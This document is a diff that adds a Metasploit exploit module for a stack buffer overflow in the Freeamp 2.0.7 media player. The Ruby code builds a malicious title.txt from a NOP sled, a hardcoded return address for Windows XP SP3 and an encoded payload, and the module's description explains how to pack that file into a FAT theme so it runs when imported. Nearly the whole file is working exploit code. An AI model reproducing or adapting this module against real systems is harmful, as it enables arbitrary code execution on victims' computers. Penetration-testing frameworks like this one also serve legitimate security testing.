@@ -1,0 +1,83 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = GreatRanking
+
+	include Msf::Exploit::FILEFORMAT
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Freeamp 2.0.7 (FAT File) Stack Buffer Overflow',
+			'Description'    => %q{
+					This module exploits a buffer overflow vulnerability
+					found in Freeamp 2.0.7. The overflow occurs when an
+					overly long string is parsed in the FAT file. This
+					module creates a txt file that has to be used in the
+					creation of a FAT file. The FAT file then has to be
+					imported as a theme. To create the FAT file you need
+					to first decompress the basic theme template,
+					MakeTheme -d freeamp.fat. Next create the new FAT file
+					MakeTheme crash.fat theme.xml title.txt *.bmp.
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         => [ 
+					      'Ivan Garcia Ferreira',	# Initial Discovery
+					      'James Fitts'		# Metasploit Module
+					    ],
+			'Version'        => '$Revision: $',
+			'References'     =>
+				[
+					[ 'URL', 'http://www.exploit-db.com/exploits/17441' ],
+				],
+			'DefaultOptions' =>
+				{
+					'EXITFUNC' => 'process',
+					'DisablePayloadHandler' => 'true',
+				},
+			'Payload'        =>
+				{
+					'BadChars' => "\x00\x0a\x0d",
+				},
+			'Platform' => 'win',
+			'Targets'        =>
+				[
+					[ 
+						'Windows XP SP3 EN', 
+						{ 
+							'Ret' => 0x1220161a, # push esp, ret 04 in download.ui
+							'Offset' => 268
+						} 
+					],
+				],
+			'Privileged'     => false,
+			'DisclosureDate' => 'Jun 23 2011',
+			'DefaultTarget'  => 0))
+
+			register_options(
+				[
+					OptString.new('FILENAME', [ true, 'The file name.',  'title.txt']),
+				], self.class)
+	end
+
+	def exploit
+		
+		txt = make_nops(target['Offset'])
+		txt << [target.ret].pack('V')
+		txt << make_nops(50)
+		txt << payload.encoded
+		txt << make_nops(50)
+
+		print_status("Creating '#{datastore['FILENAME']}' file ...")
+
+		file_create(txt)
+
+	end
+
+end
